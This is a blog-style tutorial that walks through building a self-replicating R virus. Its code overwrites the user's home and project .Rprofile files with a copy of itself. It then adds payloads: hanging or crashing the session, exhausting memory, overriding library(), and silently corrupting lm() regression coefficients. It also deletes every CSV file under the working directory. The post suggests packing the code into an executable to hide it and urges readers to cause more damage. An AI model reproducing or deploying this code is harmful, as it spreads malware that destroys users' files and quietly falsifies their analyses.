<p>A <a href="https://en.wikipedia.org/wiki/Computer_virus">computer virus</a> is a piece of program that can:</p>
<ul>
<li>copy itself</li>
<li>do bad things</li>
</ul>
<p>This is not very hard to accomplish with R, as I will demonstrate in this article.</p>
<div id="replicate" class="section level2">
<h2>Replicate</h2>
<p>The <a href="https://gist.github.com/iqis/e4030f6af45d0d3ebae21f2816c1fc58"><em>virus</em></a> exploits R’s initilization script, <code>.Rprofile</code>. When R starts up, it is going to look for this file in the current working directory and the user’s home directory, then runs everything in it:</p>
<pre class="r"><code>{
    function() {
        rp_paths &lt;- c(&quot;~/.Rprofile&quot;, paste0(getwd(), &quot;/.Rprofile&quot;))
        inject &lt;- function(rp, code) {
            write(code, file = rp, append = FALSE)
        }
        lapply(rp_paths, inject, code = deparse(match.call()))

        cat(&quot;Wow, your R is Rancid!!!\n&quot;)
    }
}()</code></pre>
<p>When the above script is run, it will make a copy of itself through <code>deparse(match.call())</code>, and overwrite the <code>.Rprofile</code> files. The next time you open a new R session, everything you see in the above will be run again. Right now, our virus does nothing but printing something at the end of your start up message.</p>
<pre><code>...

Type &#39;demo()&#39; for some demos, &#39;help()&#39; for on-line help, or
&#39;help.start()&#39; for an HTML browser interface to help.
Type &#39;q()&#39; to quit R.

Wow, your R is Rancid!!!</code></pre>
<p>Any project that started by the user is going to have its project folder infected. Likewise, if someone copy-and-pasted the R project folder to another computer, and start R from there, his home folder is going to be infected.</p>
<p>As R is an interpreted language, this seems to be the only way to infection. To conceal our malicous code, there is a way of packing a Shiny app into a Windows executable through using a tool called <a href="https://ficonsulting.github.io/RInno/">RInno</a>, which has <a href="https://electronjs.org/">Electron</a> behind itself.</p>

<h2>Damage</h2>
<p>It looks like that the replication part of the virus is taken care of. What, then, are some malicious scripts that we can have fun with?</p>
<p>There could be countless ways.</p>
<p>One of the easiest thing to do is to hang the user’s R session. It could be done as simply as putting it to <em>sleep</em> for a really long time:</p>
<pre class="r"><code>Sys.sleep(1e9)</code></pre>
<p>… like 30 years, give or take.</p>
<p>Or, let R come up with a really large number; this is also going take up available memory to the user.</p>
<pre class="r"><code>rnorm(1e9)</code></pre>
<p>For me, 1e9 is quite enough. But scientific notaion is your friend. Go big.</p>
<p>However, if R is rendered completely unusable, the virus isn’t goint to travel very far. That’s not what we want. It is also a great idea to replace some good functions with naughty ones. Symbol bindings are locked in attached namespaces, but it is easy to undo that:</p>
<pre class="r"><code>reassign &lt;- function(sym, value, envir) {
        envir &lt;- as.environment(envir)
        unlockBinding(sym, envir)
        assign(sym, value, envir = envir)
}</code></pre>
<p>We can do the user a service by forbidding the <code>library()</code> function, and prompt a better option.</p>
<pre class="r"><code>reassign(&quot;library&quot;, 
         function(...) warning(&quot;No man, seriously. Use require()&quot;),
         &quot;package:base&quot;
)</code></pre>
<p>The effect would be:</p>
<pre class="r"><code>library(purrr)</code></pre>
<pre><code>## Warning in library(purrr): No man, seriously. Use require()</code></pre>
<p>Now let’s try something more subtle and more bad(<em>badder</em>?). We first extend the <code>reassign()</code> function a little bit…</p>
<pre class="r"><code>tamper &lt;- function(sym, value, envir){
        assign(paste0(&quot;.&quot;,sym), 
               get(sym, envir = as.environment(envir)), 
               envir = as.environment(&quot;package:base&quot;)
               )
        reassign(sym, value, envir)
}</code></pre>
<p>… and use it to slip in some bad code.</p>
<pre class="r"><code>tamper(&quot;lm&quot;,
       function(...){
               model &lt;- .lm(...)
               model$coefficients &lt;- 
                       model$coefficients * (1 + rnorm(1))
               model
               },
       &quot;package:stats&quot;)</code></pre>
<p>Now when we build a model; the coefficients looks normal, but are completely off. You can compare the this with the result on your own computer.</p>
<pre class="r"><code>lm(mpg ~ ., data = mtcars)$coefficients</code></pre>
<pre><code>## (Intercept)         cyl        disp          hp        drat          wt 
## 15.96151239 -0.14457486  0.01730018 -0.02786936  1.02114114 -4.81996800 
##        qsec          vs          am        gear        carb 
##  1.06515919  0.41224261  3.26956103  0.85028569 -0.25871219</code></pre>
<p>In the above, we saved a copy of the original function in the base package, concealing it with prepending the name wit a <code>.</code>. If we didn’t do that, we would have create an infinite recursion through self-refernce, such as:</p>
<pre class="r"><code>reassign(&quot;paste&quot;,
         function(...) paste(...),
         &quot;package:base&quot;)</code></pre>
<pre class="r"><code>paste(&quot;foo&quot;, &quot;bar&quot;)</code></pre>
<p>Running this will have an effect of crashing the R session. If the user didn’t save documents before setting off this bomb,it’s obviously too bad. Another way to create trouble.</p>
</div>
<div id="further-damage" class="section level2">
<h2>Further Damage</h2>
<p>There are yet more ways to our streak of mischief. For starters, how about deleting every <code>csv</code> file the user has in the working directory?</p>
<pre class="r"><code>file.remove(list.files(getwd(), 
                       &quot;.csv&quot;,
                       recursive = TRUE)</code></pre>
<p>Doing something on the file system is a big step foward form just messing with their R session.</p>
<p>From annoying to destructive, the level of naughtiness only limited by on your imagination. With some deliberation, you can ruin someone’s life in a very meaningful way.</p>
<p>Here are some futher ideas:</p>
<ul>
<li>Bloat the user’s disk space with meaningless data</li>
<li>Give wrong results only <em>sometimes</em> when a function is called</li>
<li>Use <a href="https://rstudio.github.io/rstudio-extensions/pkgdown/rstudioapi/index.html">Rstudio API</a> to mess with the user’s scripts in the editor, or some other wild sh*t.</li>
</ul>
<p><strong>Note</strong><br />
You also have the choice of putting any of the malicious programs in <code>.First()</code> and <code>.Last()</code> functions, which will run at the beginning and the end of a session. See the <a href="https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html">R Manual</a> for details.</p>
